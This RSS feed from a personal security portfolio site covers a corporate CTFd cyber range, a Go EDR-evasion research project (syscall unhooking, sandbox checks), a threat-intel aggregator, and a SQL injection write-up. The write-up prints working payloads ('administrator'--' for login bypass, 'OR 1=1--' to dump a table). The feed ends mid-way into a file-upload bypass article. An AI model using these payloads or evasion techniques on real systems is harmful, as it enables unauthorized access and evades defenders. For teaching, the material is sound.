<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Home on user@cybrealm:~$</title>
    <link>http://localhost:1313/</link>
    <description>Recent content in Home on user@cybrealm:~$</description>
    <generator>Hugo -- gohugo.io</generator>
      <language>en-us</language>
      <lastBuildDate>Thu, 27 Nov 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Enterprise Cyber Range (Customized CTFd)</title>
      <link>http://localhost:1313/projects/local-ctf-platform/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/projects/local-ctf-platform/</guid>
      <description>&lt;h1 id=&#34;project-status-production&#34;&gt;
  Project Status: [Production]
  &lt;a href=&#34;#project-status-production&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;overview&#34;&gt;
  Overview
  &lt;a href=&#34;#overview&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;To upskill the internal security team, I deployed and heavily customized a &lt;strong&gt;CTFd&lt;/strong&gt; instance. Unlike standard CTFs which often focus on &amp;ldquo;guessing,&amp;rdquo; this platform is designed to simulate real-world vulnerabilities found in our corporate environment.&lt;/p&gt;

&lt;h2 id=&#34;custom-engineering&#34;&gt;
  Custom Engineering
  &lt;a href=&#34;#custom-engineering&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Interface Redesign:&lt;/strong&gt; Modified the default CTFd Jinja2 templates and CSS to match corporate branding and improve the UX for non-gamers.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Challenge Architecture:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Web Security:&lt;/strong&gt; Custom Docker containers running vulnerable apps (SQLi, SSRF, Insecure Deserialization).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Linux Skills:&lt;/strong&gt; SSH-based challenges testing grep/awk/sed proficiency and log analysis.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reversing &amp;amp; Forensics:&lt;/strong&gt; Artifact analysis challenges based on real malware samples.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Crypto:&lt;/strong&gt; Practical cryptography failures (e.g., weak RSA keys, padding oracles).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;impact&#34;&gt;
  Impact
  &lt;a href=&#34;#impact&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reduced reliance on expensive external training vendors.&lt;/li&gt;
&lt;li&gt;Allows the team to practice &amp;ldquo;Red vs Blue&amp;rdquo; scenarios in a safe, isolated environment.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Documentation on specific challenge design is available internally.&lt;/em&gt;&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;project-status-production&#34;&gt;
  Project Status: [Production]
  &lt;a href=&#34;#project-status-production&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;overview&#34;&gt;
  Overview
  &lt;a href=&#34;#overview&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;To upskill the internal security team, I deployed and heavily customized a &lt;strong&gt;CTFd&lt;/strong&gt; instance. Unlike standard CTFs which often focus on &amp;ldquo;guessing,&amp;rdquo; this platform is designed to simulate real-world vulnerabilities found in our corporate environment.&lt;/p&gt;

&lt;h2 id=&#34;custom-engineering&#34;&gt;
  Custom Engineering
  &lt;a href=&#34;#custom-engineering&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Interface Redesign:&lt;/strong&gt; Modified the default CTFd Jinja2 templates and CSS to match corporate branding and improve the UX for non-gamers.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Challenge Architecture:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Web Security:&lt;/strong&gt; Custom Docker containers running vulnerable apps (SQLi, SSRF, Insecure Deserialization).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Linux Skills:&lt;/strong&gt; SSH-based challenges testing grep/awk/sed proficiency and log analysis.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reversing &amp;amp; Forensics:&lt;/strong&gt; Artifact analysis challenges based on real malware samples.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Crypto:&lt;/strong&gt; Practical cryptography failures (e.g., weak RSA keys, padding oracles).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;impact&#34;&gt;
  Impact
  &lt;a href=&#34;#impact&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reduced reliance on expensive external training vendors.&lt;/li&gt;
&lt;li&gt;Allows the team to practice &amp;ldquo;Red vs Blue&amp;rdquo; scenarios in a safe, isolated environment.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Documentation on specific challenge design is available internally.&lt;/em&gt;&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Project Mantis: Evasion Research</title>
      <link>http://localhost:1313/projects/mantis-c2/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/projects/mantis-c2/</guid>
      <description>&lt;h1 id=&#34;status-research-phase&#34;&gt;
  Status: [Research Phase]
  &lt;a href=&#34;#status-research-phase&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;concept&#34;&gt;
  Concept
  &lt;a href=&#34;#concept&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Mantis is a codebase I use to experiment with Windows API interaction in Golang. It serves as a testbed for understanding how modern EDRs hook specific syscalls and how static signatures are generated for Go binaries.&lt;/p&gt;

&lt;h2 id=&#34;current-research-focus&#34;&gt;
  Current Research Focus
  &lt;a href=&#34;#current-research-focus&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Syscall Unhooking:&lt;/strong&gt; Analyzing how direct syscalls can bypass userland hooks.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Sandbox Heuristics:&lt;/strong&gt; Implementing checks for CPU cores and uptime to detect analysis environments.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;This is a private research project.&lt;/em&gt;&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;status-research-phase&#34;&gt;
  Status: [Research Phase]
  &lt;a href=&#34;#status-research-phase&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;concept&#34;&gt;
  Concept
  &lt;a href=&#34;#concept&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Mantis is a codebase I use to experiment with Windows API interaction in Golang. It serves as a testbed for understanding how modern EDRs hook specific syscalls and how static signatures are generated for Go binaries.&lt;/p&gt;

&lt;h2 id=&#34;current-research-focus&#34;&gt;
  Current Research Focus
  &lt;a href=&#34;#current-research-focus&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Syscall Unhooking:&lt;/strong&gt; Analyzing how direct syscalls can bypass userland hooks.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Sandbox Heuristics:&lt;/strong&gt; Implementing checks for CPU cores and uptime to detect analysis environments.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;This is a private research project.&lt;/em&gt;&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Regional Threat Intelligence Aggregator</title>
      <link>http://localhost:1313/projects/regional-threat-intel/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/projects/regional-threat-intel/</guid>
      <description>&lt;h1 id=&#34;project-status-active-development&#34;&gt;
  Project Status: [Active Development]
  &lt;a href=&#34;#project-status-active-development&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;the-problem&#34;&gt;
  The Problem
  &lt;a href=&#34;#the-problem&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Global threat feeds are noisy. A &amp;ldquo;High Severity&amp;rdquo; C2 alert for a US-based bank is irrelevant noise for infrastructure in Georgia. This noise causes alert fatigue in the SOC, leading to missed detections of regionally relevant threats.&lt;/p&gt;

&lt;h2 id=&#34;the-solution&#34;&gt;
  The Solution
  &lt;a href=&#34;#the-solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;A custom aggregation engine that pulls from high-fidelity sources, filters data against a &amp;ldquo;Regional Relevance&amp;rdquo; dictionary, and visualizes active campaigns on a custom dashboard.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;project-status-active-development&#34;&gt;
  Project Status: [Active Development]
  &lt;a href=&#34;#project-status-active-development&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;the-problem&#34;&gt;
  The Problem
  &lt;a href=&#34;#the-problem&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Global threat feeds are noisy. A &amp;ldquo;High Severity&amp;rdquo; C2 alert for a US-based bank is irrelevant noise for infrastructure in Georgia. This noise causes alert fatigue in the SOC, leading to missed detections of regionally relevant threats.&lt;/p&gt;

&lt;h2 id=&#34;the-solution&#34;&gt;
  The Solution
  &lt;a href=&#34;#the-solution&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;A custom aggregation engine that pulls from high-fidelity sources, filters data against a &amp;ldquo;Regional Relevance&amp;rdquo; dictionary, and visualizes active campaigns on a custom dashboard.&lt;/p&gt;

&lt;h2 id=&#34;tech-stack&#34;&gt;
  Tech Stack
  &lt;a href=&#34;#tech-stack&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Core Logic:&lt;/strong&gt; Python (API Glue &amp;amp; Filtering Engine).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Feeds:&lt;/strong&gt; AlienVault OTX, ThreatFox (C2 Intel), and 100+ Security Blog RSS feeds.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Visualization:&lt;/strong&gt; Grafana (Real-time dashboarding of active threats).&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;key-modules&#34;&gt;
  Key Modules
  &lt;a href=&#34;#key-modules&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;The Collector:&lt;/strong&gt; Async Python workers polling OTX and ThreatFox APIs.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The Filter:&lt;/strong&gt; A keyword/ASN matching engine that discards 99% of global noise to focus on threats targeting the region.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;The UI:&lt;/strong&gt; Custom Grafana panels tracking &amp;ldquo;Active C2s in Region&amp;rdquo; and &amp;ldquo;Emerging Blog Topics.&amp;rdquo;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Codebase currently private. Deployment requires API keys for OTX.&lt;/em&gt;&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Research: Boolean &amp; Logic-Based SQL Injection</title>
      <link>http://localhost:1313/research/sql-injection-patterns/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/research/sql-injection-patterns/</guid>
      <description>&lt;h2 id=&#34;1-authentication-bypass-via-comment-injection&#34;&gt;
  1. Authentication Bypass via Comment Injection
  &lt;a href=&#34;#1-authentication-bypass-via-comment-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Login mechanisms frequently construct queries by concatenating user input directly into a string.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Backend Logic:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$user&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Injection Vector:&lt;/strong&gt;
By appending the SQL comment sequence (&lt;code&gt;--&lt;/code&gt;), we can truncate the query immediately after the username, effectively removing the password validation requirement.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;administrator&#39;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resulting Query:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND password = &amp;#39;...&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The database engine interprets this as a valid query for the user &amp;ldquo;administrator&amp;rdquo;, ignoring the remainder of the string.&lt;/p&gt;</description>
      <content>
&lt;h2 id=&#34;1-authentication-bypass-via-comment-injection&#34;&gt;
  1. Authentication Bypass via Comment Injection
  &lt;a href=&#34;#1-authentication-bypass-via-comment-injection&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Login mechanisms frequently construct queries by concatenating user input directly into a string.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Backend Logic:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$user&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$pass&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Injection Vector:&lt;/strong&gt;
By appending the SQL comment sequence (&lt;code&gt;--&lt;/code&gt;), we can truncate the query immediately after the username, effectively removing the password validation requirement.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;administrator&#39;--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resulting Query:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; users &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND password = &amp;#39;...&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The database engine interprets this as a valid query for the user &amp;ldquo;administrator&amp;rdquo;, ignoring the remainder of the string.&lt;/p&gt;

&lt;h2 id=&#34;2-boolean-inference-hidden-data-retrieval&#34;&gt;
  2. Boolean Inference (Hidden Data Retrieval)
  &lt;a href=&#34;#2-boolean-inference-hidden-data-retrieval&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Applications often use hidden flags (e.g., &lt;code&gt;released = 1&lt;/code&gt;) to filter content. We can override these filters using Boolean tautologies.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Target Request:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /filter?category=Pets &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Backend Query:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Pets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AND&lt;/span&gt; released &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Injection Payload:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;http&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; /filter?category=Pets&amp;#39;+OR+1=1--&amp;#39; &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Execution Logic:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;sql&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; products &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt; category &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Pets&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OR&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--&amp;#39; AND released = 1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Since &lt;code&gt;1=1&lt;/code&gt; evaluates to TRUE for every row in the table, the database returns the entire dataset, including unreleased or internal items. This technique effectively dumps the table without requiring a UNION attack.&lt;/p&gt;
</content>
    </item>
    <item>
      <title>Research: Bypassing Modern File Upload Filters</title>
      <link>http://localhost:1313/research/bypassing-file-upload-filters/</link>
      <pubDate>Thu, 27 Nov 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/research/bypassing-file-upload-filters/</guid>
      <description>&lt;h2 id=&#34;abstract&#34;&gt;
  Abstract
  &lt;a href=&#34;#abstract&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;File upload vulnerabilities remain a critical vector for Remote Code Execution (RCE). While developers often implement validation mechanisms (MIME type checks, blacklists), these are frequently based on &amp;ldquo;trusting user input.&amp;rdquo; This report documents specific bypass techniques I analyzed during recent research.&lt;/p&gt;

&lt;h2 id=&#34;1-content-type-spoofing&#34;&gt;
  1. Content-Type Spoofing
